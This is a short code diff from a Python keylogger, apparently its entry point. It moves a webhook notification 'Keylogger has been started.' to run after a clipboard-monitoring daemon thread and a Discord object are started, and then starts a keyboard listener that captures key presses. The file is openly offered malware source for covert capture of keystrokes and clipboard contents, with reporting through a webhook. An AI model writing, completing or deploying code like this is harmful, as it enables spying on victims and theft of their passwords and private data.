@@ -510,13 +510,14 @@ def startup():
         pass
 
 if __name__ == '__main__':
-    send_to_webhook("Keylogger has been started.")
 
     clipboard_thread = threading.Thread(target=monitor_clipboard)
     clipboard_thread.daemon = True
     clipboard_thread.start()
 
     discord = Discord()
+
+    send_to_webhook("Keylogger has been started.")
 
     with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
